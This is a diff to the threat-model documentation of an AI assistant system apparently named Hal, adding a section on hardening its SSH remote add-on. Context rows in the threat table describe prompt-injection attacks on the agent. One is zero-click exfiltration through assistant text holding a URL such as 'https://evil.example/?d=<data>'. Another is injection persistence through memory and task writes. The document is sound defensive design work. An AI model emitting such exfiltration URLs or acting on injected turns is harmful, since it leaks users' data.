@@ -121,6 +121,16 @@ Boundaries:
 | T30 | Zero-click render exfiltration | ADV1, ADV2 | Assistant text with `https://evil.example/?d=<data>` rendered by a client that fetches previews or images | No Hal UI fetches model-named URLs; Telegram link previews disabled; console CSP (REQ-SEC-73) | ACP editors that load Markdown images (residual risk 11) |
 | T31 | Injection persistence | ADV2 | An injected turn calls `memory_remember`, `tasks_add` or `calendar_add` (tier `write`, allowed) | Reads of those stores are `untrusted_output` (08), so later sessions get the envelope and taint | With the guard off taint changes no verdict (residual risk 10) |
 
+## Remote (SSH add-on)
+
+`hal-remote` adds SSH as the only path from a laptop to the desktop. Each client gets two keys
+with restricted `authorized_keys` options: a tunnel key that may only forward to the gateway
+port, and an mcp key whose forced command accepts three verbs. Host keys are pinned per profile
+with `StrictHostKeyChecking yes`, the gateway token is delivered once over the mcp key, and no
+agent or X11 forwarding is requested. The full table of threats and what contains each is in
+[07-remote.md](../design/07-remote.md) (section "Threat model"). Revoke a client with
+`hal remote revoke NAME` on the desktop.
+
 ## Residual risks (documented, not hidden)
 
 1. Files the model writes into the workspace can later run as the user: build files, scripts,
